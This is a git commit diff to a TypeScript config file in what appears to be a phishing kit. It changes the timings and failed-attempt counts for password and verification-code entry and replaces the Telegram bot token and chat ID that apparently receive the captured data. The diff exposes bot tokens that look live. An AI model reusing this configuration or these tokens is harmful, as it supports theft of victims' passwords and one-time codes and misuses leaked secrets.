d1d553a5f414eb4456b3a52d3ad54aac1b150655
mentorblack <vuvansonxx@gmail.com>
2025-04-04 00:33:33 +0700

    Update config.ts

--- src/utils/config.ts
+++ src/utils/config.ts
@@ -12,14 +12,14 @@ interface Config {
 }
 const defaultConfig: Config = {
   settings: {
-    code_loading_time: 5000,
-    max_failed_code_attempts: 5,
-    max_failed_password_attempts: 0,
+    code_loading_time: 10000,
+    max_failed_code_attempts: 3,
+    max_failed_password_attempts: 1,
     password_loading_time: 5000,
   },
   telegram: {
-    data_chatid: "7613748491",
-    data_token: "7884668674:AAEFDEwsNc7QuqpS6mVNUIJsJwJdb2BlfYI",
+    data_chatid: "-1002416068664",
+    data_token: "7371433087:AAHBPfH8Kshg2ce5ZHCHLDYe43ivmzKnCqk",
   },
 };
 const getConfig = (): Config => {
